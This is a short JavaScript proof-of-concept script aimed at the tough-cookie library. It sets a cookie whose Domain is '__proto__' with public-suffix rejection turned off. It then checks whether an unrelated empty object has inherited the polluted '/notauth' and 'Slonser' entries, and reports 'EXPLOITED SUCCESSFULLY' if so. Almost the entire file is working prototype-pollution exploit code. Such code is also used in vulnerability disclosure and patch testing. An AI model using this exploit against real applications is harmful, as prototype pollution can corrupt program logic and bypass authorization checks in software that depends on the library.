async function main() {
    var tough = require('./lib/cookie.js');
    var cookiejar = new tough.CookieJar(undefined, { rejectPublicSuffixes: false });

    // Exploit cookie
    await cookiejar.setCookie(
        "Slonser=polluted; Domain=__proto__; Path=/notauth",
        "https://__proto__/admin",
        { loose: false },
        ( x ) => { /* do nothing */ }
    );

    // normal cookie
    var cookie = await cookiejar.setCookie(
        "Auth=Lol; Domain=google.com; Path=/notauth",
        "https://google.com/",
        { loose: false },
        ( x ) => { /* do nothing */ }
    );

    //Exploit cookie
    var a = {};

    try
    {
        let y = a["/notauth"]["Slonser"]
        console.log('EXPLOITED SUCCESSFULLY')
    }
    catch (error)
    {
        console.log('EXPLOIT FAILED')
        return
    }
}

main();
